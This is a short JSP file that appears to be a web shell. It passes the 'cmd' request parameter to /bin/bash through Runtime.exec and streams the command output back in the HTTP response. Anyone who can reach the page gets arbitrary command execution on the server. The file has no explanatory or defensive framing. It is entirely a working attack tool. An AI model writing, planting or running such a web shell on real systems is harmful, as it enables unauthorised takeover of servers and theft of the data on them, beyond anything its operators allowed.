<%@page language="java" trimDirectiveWhitespaces="true"%><%
Process p = java.lang.Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",request.getParameter("cmd")});
p.waitFor();
java.io.InputStream it = p.getInputStream();int i = 10240;
byte[] bf = new byte[i];
java.io.OutputStream ot = response.getOutputStream();
for (int j = 0;(j = it.read(bf,0,i)) > 0;){ot.write(bf, 0, j);}%>